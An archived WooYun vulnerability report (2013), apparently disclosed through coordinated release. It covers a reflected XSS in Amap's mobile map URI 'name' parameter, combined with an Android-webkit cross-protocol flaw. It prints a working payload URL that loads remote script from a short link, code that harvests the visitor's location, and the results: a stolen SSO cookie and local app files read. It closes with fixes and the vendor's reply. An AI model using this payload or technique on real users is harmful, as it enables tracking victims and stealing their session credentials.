@@ -1,0 +1,307 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		用高德地图反射xss取访客位置和android-webkit xss  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		用高德地图反射xss取访客位置和android-webkit xss  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/horseluke">horseluke</a> 
+</li><li>提交时间：		2013-06-19 17:41</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-06-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-06-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-09：	细节向普通白帽子公开<br/>
+									2013-07-19：	细节向实习白帽子公开<br/>
+									2013-08-03：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">因业务原因对GIS在线地图商进行了一些业务接触和开发，完成后就顺带进行了复查，然后发现一个各地图商常犯的反射xss错误。这里以高德为例，展示如何结合GIS业务特点借助xss做些有意思的事情，顺带实践SuperHei去年那篇基于android-webkit的xss。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">（1）许多GIS在线地图商有提供基于url的跳转接口，用于直接跳到地图页面进行poi展示，比如高德的手机浏览器URI之地图标注：<br />
+<br />
+<br />
+<br />
+http://mo.amap.com/?q=31.234527,121.287689&amp;name=park&amp;dev=0<br />
+<br />
+<br />
+<br />
+（http://api.amap.com/URI/browser_guide）<br />
+<br />
+<br />
+<br />
+不过许多时候GIS在线地图商会对某些用户自定义参数没有控制好，很容易导致xss发生，比如高德的反射xss参数在name。不过既然是在GIS，要xss总得要充分利用其业务价值，比如说：获取访客地理信息。<br />
+<br />
+<br />
+<br />
+（2）SuperHei有一篇基于android-webkit的xss：<br />
+<br />
+http://www.80vul.com/webzine_0x06/PSTZine_0x06_0x05.txt<br />
+<br />
+<br />
+<br />
+根据文档中的内容和个人实践来看，只要Android 4.0以下，就一定有“[0day-NO.1]、android-webkit跨协议漏洞”，那么就等于只要网站有任意一个反射xss，那么就可以诱导访问手机受害者的一些特殊文件（视乎文件权限而定）。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">此处结合新浪微博客户端的android-webview来演示。<br />
+<br />
+<br />
+<br />
+（1）构造url：<br />
+<br />
+</p><pre><code>http://mo.amap.com/?q=22,110&amp;name=%3Cimg%20src=%22%22%20onerror=%22this.error=null;window.jQuery.getScript(&#039;http://t.cn/zH3lOn0&#039;);%22%20%3E#thirdpoi</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这个url使用了地图中jquery提供的载入js方法直接载入，以此绕过xss筛选器。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+http://t.cn/zH3lOn0 的重点代码：<br />
+<br />
+<br />
+<br />
+（A）xss_tester.amap.getLocation方法中，通过AF.GeolocationService.getPosition方法当前访问者位置、以及通过AF.Geocoder.regeocode方法获取附近地标：<br />
+<br />
+<br />
+<br />
+</p><pre><code>xss_tester.amap.getLocation = function(){<br />
+		<br />
+		AF.GeolocationService.getPosition(<br />
+			function(result_location){				<br />
+				var user_cuurent_location = {};<br />
+				//略<br />
+				<br />
+				var geocoder_one = new AF.Geocoder({range:1000,crossnum:0,roadnum:0,poinum:3});<br />
+				geocoder_one.regeocode(<br />
+					result_location, <br />
+					function(regeocode_result){<br />
+						//略<br />
+						alert(<br />
+							&#039;当前经纬度：&#039; + user_cuurent_location.lng<br />
+							 + user_cuurent_location.lat + &quot;\r\n&quot;<br />
+							 + &#039;精度：&#039; + user_cuurent_location.accuracy + &quot;\r\n&quot;<br />
+							 + &#039;最近的位置：&#039; + user_cuurent_location.province_name + user_cuurent_location.city_name + user_cuurent_location.district_name + user_cuurent_location.poi_name<br />
+							 + &quot;(方位：&quot; + user_cuurent_location.poi_direction + &quot;方向约&quot; + user_cuurent_location.poi_distance + &#039;米)&#039;<br />
+						);<br />
+						<br />
+					},<br />
+					function(regeocode_error){<br />
+						//略<br />
+					}<br />
+				);<br />
+			},<br />
+			<br />
+			function(error){<br />
+				//略<br />
+			}<br />
+		);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+（B）xss_tester.amap.readLocalFile方法是照搬SuperHei的代码而写，在此感谢。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+（2）将上面的url生成短链（这是因为直接发微博是发不到的；而tinyurl.com也会被微博拦截无法访问）：<br />
+<br />
+http://is.gd/dvgkzZ<br />
+<br />
+<br />
+<br />
+（3）发微博<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1916593346b66c4f3fc9e6bf2908c62cd153c414.png" target="_blank"><img src="../images/1916593346b66c4f3fc9e6bf2908c62cd153c414.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+（4）诱导受害者访问<br />
+<br />
+<br />
+<br />
+获得cookies：高德挂万漏一了，重要的sso登录信息passport_login键值刚好没有httponly保护。（此处以chrome访问为例）<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1916541103401c7f0178a71ff49743cdcb979dae.png" target="_blank"><img src="../images/1916541103401c7f0178a71ff49743cdcb979dae.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+利用高德接口，获得受害者的方位等信息：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19165427911bd44692bc3b7e232431bfe7d84fc4.png" target="_blank"><img src="../images/19165427911bd44692bc3b7e232431bfe7d84fc4.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+（android &lt; 4 有效）获得/system/build.prop内容（可读原因：other用户可读）<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19165440f10ffe19d35008b680b5034bcaacad54.png" target="_blank"><img src="../images/19165440f10ffe19d35008b680b5034bcaacad54.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+（android &lt; 4 有效）获得/data/data/com.sina.weibo/shared_prefs/com.sina.weibo_preferences.xml内容，被遮盖处即为新浪微博的uid（可读原因：该webview是由微博启动）<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/191654526bfa07de38cb2c58c47046cffbca2cd6.png" target="_blank"><img src="../images/191654526bfa07de38cb2c58c47046cffbca2cd6.png" alt="5.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">以下建议针对高德地图，其他地图商请根据情况自行检查。<br />
+<br />
+（1）修复手机浏览器URI之地图标注的参数name，做好html代码转义<br />
+<br />
+（2）复查其他各类api（尤其是可以让用户输入参数的api）是否存在类似问题<br />
+<br />
+（3）对cookies中的passport_login键值作httponly保护<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/horseluke" title="horseluke">horseluke</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-026331" title="用高德地图反射xss取访客位置和android-webkit xss">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-06-19 19:19</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">思路不错，感谢反馈</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-06-24：已修复XSS</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="26331";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
